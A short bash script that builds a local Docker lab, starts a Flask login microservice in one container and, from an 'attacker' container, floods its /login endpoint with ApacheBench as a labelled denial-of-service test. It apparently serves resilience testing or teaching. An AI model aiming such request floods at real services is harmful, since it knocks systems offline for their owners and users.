#!/bin/bash

# Step 1: Create Docker network
docker network create dosnet

# Step 2: Start microservice container
docker run -dit --name microservice --network dosnet -v $(pwd):/app ubuntu:latest

# Step 3: Install and run Flask in the microservice container
docker exec microservice bash -c "
apt update && apt install -y python3 python3-pip &&
pip3 install flask &&
cd /app &&
nohup python3 auth_service.py > /app/microservice.log 2>&1 &
"

# Step 4: Start attacker container
docker run -dit --name attacker --network dosnet ubuntu:latest

# Step 5: Install tools in attacker container and run DoS
docker exec attacker bash -c "
apt update && apt install -y apache2-utils curl &&
sleep 5 &&
ab -n 100000 -c 500 http://microservice:5000/login > /ab_results.txt
"

echo "✅ DoS attack initiated from 'attacker' to 'microservice'. Check logs using:"
echo "docker exec microservice tail -f /app/microservice.log"
